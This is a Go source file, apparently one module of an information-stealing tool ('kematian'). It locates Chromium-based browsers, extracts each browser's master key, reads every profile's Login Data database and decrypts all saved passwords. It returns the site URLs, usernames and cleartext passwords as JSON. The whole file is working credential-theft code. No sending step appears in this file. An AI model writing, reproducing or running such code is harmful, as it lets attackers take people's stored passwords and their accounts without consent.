package passChromium

import (
	"database/sql"
	"encoding/json"
	"kdot/kematian/browsers/structs"
	"kdot/kematian/decryption"
)

type Passwords struct {
	OriginURL string `json:"origin_url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
}

func Get(browsersList []structs.Browser) string {
	var passwords []Passwords

	for _, browser := range browsersList {
		if !browser.IsChromium {
			continue
		}
		master_key := decryption.GetMasterKey(browser.LocalState)
		if len(master_key) == 0 {
			continue
		}
		for _, profile := range browser.Profiles {
			path := profile.LoginData

			db, err := sql.Open("sqlite3", path)
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var origin_url string
				var username_value string
				var password_value []byte
				row.Scan(&origin_url, &username_value, &password_value)
				decrypted, err := decryption.DecryptPassword(password_value, master_key)
				if err != nil {
					decrypted = string(password_value)
				}
				// I think this occurs when a user presses no to save password it still stores it (weird)
				if username_value == "" && decrypted == "" {
					continue
				}
				passwords = append(passwords, Passwords{origin_url, username_value, decrypted})
			}
		}
	}
	jsonData, err := json.MarshalIndent(passwords, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
